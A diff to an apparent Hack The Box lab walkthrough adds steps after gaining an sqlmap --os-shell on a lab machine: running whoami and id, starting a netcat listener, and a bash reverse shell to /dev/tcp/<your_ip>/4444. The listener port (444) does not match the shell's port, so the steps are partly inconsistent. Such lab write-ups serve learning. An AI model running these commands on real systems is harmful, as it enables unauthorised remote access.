@@ -77,7 +77,13 @@ Notification: The words that are hyperlinked are to resources to learn more abou
     - sqlmap provides an easy way to get a shell with this vulnerabilites. it is as easy as adding `--os-shell` to the end of our previous command which I will show right below this
     - `sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=0h8aobaj9glv58eeme3bsb0l0g" --os-shell`
       - I had issues with this for this. It is always important to check you syntax very diligently. I was missing the last character on my cookie when I copied and pasted it into the command. That prevented my from obtaining a shell for a little bit. 
-      - ALWAYS CHECK YOUR SYNTAX 
+      - ALWAYS CHECK YOUR SYNTAX
 
-
-
+3. OS-Shell
+  - Now that we have access to our os shell lets a run a few inital commnads. 
+    - `whoami` & `id`
+    - These commands will tell us what user we are and what this use has access too. 
+  - We are going to try and create a reverse shell like we did in the previous machine.
+    - lets set up our listner with the netcat command `nc -lvnp 444`
+    - now lets run the reverse shell creation command in our os shell `bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`
+    
